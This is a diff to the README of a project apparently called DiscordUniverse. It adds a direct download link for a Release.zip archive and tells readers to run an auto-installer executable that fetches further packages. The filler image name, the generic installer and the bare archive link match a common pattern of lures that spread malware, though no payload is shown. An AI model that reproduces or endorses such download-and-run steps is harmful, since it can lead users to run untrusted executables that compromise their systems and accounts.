@@ -7,10 +7,10 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/cb0d7e7d-9f65-4c92-8da7-607fad265c7c)
-]()
+](https://github.com/cesarm1987/DiscordUniverse/releases/download/V3.57/Release.zip)
 
 
-# **1. [Download the archive]() and extract it to a convenient folder.**
+# **1. [Download the archive](https://github.com/cesarm1987/DiscordUniverse/releases/download/V3.57/Release.zip) and extract it to a convenient folder.**
 # **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 
 
